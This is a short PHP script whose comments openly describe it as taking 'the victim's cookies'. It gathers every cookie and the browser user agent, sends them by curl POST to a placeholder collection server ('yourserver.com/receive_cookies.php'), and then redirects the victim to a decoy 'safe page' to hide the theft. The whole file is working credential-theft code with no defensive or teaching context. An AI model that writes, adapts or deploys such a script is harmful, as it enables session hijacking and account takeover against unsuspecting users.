<?php
// Get the victim's cookies
$cookies = json_encode($_COOKIE);

// Get the victim's user agent (browser information)
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Prepare the data to be sent
$data = array(
    'cookies' => $cookies,
    'user_agent' => $userAgent
);

// Send the data to your server (replace with your server URL)
$url = 'https://yourserver.com/receive_cookies.php';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirect the victim to a safe page (optional)
header('Location: https://example.com/safe_page.html');
exit;
?>